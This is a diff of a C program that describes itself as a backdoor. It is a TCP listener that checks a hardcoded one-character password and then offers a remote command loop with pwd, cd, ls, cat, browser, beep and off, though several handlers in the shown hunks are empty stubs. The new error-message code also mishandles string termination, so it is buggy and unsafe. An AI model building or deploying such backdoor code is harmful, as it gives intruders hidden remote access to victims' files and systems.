@@ -19,14 +19,17 @@ void error(const char *msg)
 
 int main(int argc, char *argv[])
 {
-    int sockfd, newsockfd, portno;
+    const char* invalidCommand = " is not a valid command\n";
     socklen_t clilen;
     char buffer[256];
     char password[] = "a\n";
+    char badCommand_substring[256];
     struct sockaddr_in serv_addr, cli_addr;
-    int n;
+    int n, badCommandLength, badCommandLengthMinus, newStringLength;
     int offStatus = 1, runEnd = 1;
     int i_counter;
+    int sockfd, newsockfd, portno;  
+    
     if (argc < 2) {
         fprintf(stderr,"ERROR, no port provided\n");
         exit(1);
@@ -63,7 +66,7 @@ int main(int argc, char *argv[])
     n = write(newsockfd, "password: ", 10);
     bzero(buffer, 256);
     if(n<0) offStatus = 0;
-    n = read(newsockfd, buffer, 1);
+    n = read(newsockfd, buffer, 2);
     printf("%s\n", buffer);
     if (strncmp(password, buffer, 2) != 0 )
     {
@@ -71,17 +74,15 @@ int main(int argc, char *argv[])
         error("Error: incorrect password");
         offStatus = 0;
     }
-    n = write(newsockfd, "Welcome to this backdoor", 26);
+    n = write(newsockfd, "Welcome to this backdoor\n", 26);
     do {
+        n = write(newsockfd, ">", 1);
         bzero(buffer,256);
         n = read(newsockfd,buffer,255);
         //find the command
-        if(strncmp(buffer, "help\n", 5) == 0){
-            printf("We are in help");
-        }
         if (n < 0) error("ERROR reading from socket");
         printf("Here is the message: %s\n",buffer);
-        n = write(newsockfd,"I got your message",18);
+        //n = write(newsockfd,"I got your message",18);
         if (n < 0) error("ERROR writing to socket");
         
         if (strncmp(buffer, "pwd\n", 4) == 0) {
@@ -93,11 +94,29 @@ int main(int argc, char *argv[])
         } else if (strncmp(buffer, "cat ", 3) == 0) {
             //if things exist, con't
         } else if (strncmp(buffer, "help\n", 5) == 0) {
+            n = write(newsockfd, "pwd \t\t returns current working directory\n", 41);
+            n = write(newsockfd, "cd <dir> \t changes current working directory to <dir>\n",54);
+            n = write(newsockfd, "ls \t\t lists the contents of the current working directory\n", 58);
+            n = write(newsockfd, "cat <file> \t returns contents of the file\n", 42);
+            n = write(newsockfd, "help \t\t prints a list of commands\n", 34);
+            n = write(newsockfd, "browser \t opens up Mozilla Firefox\n", 36);
+            n = write(newsockfd, "beep \t\t makes computer beep\n", 28);
+            n = write(newsockfd, "off \t\t terminates the program\n", 30);
+        } else if (strncmp(buffer, "browser\n", 8) == 0) {
             
+        } else if (strncmp(buffer, "beep\n", 5) == 0) {
+        
         } else if (strncmp(buffer, "off\n", 4) == 0) {
-            
+            n = write(newsockfd, "You killed me...\n", 17);
+            offStatus = 0;
         } else {
-            
+            badCommandLength = strlen(buffer);
+            badCommandLengthMinus = badCommandLength-1;
+            strncpy(badCommand_substring, buffer, badCommandLengthMinus); 
+            strcat(badCommand_substring, invalidCommand);
+            newStringLength = strlen(badCommand_substring);
+            n = write(newsockfd, badCommand_substring, newStringLength);
+            memset(badCommand_substring, 0, sizeof(badCommand_substring));
         }
         
     }while (offStatus == 1);
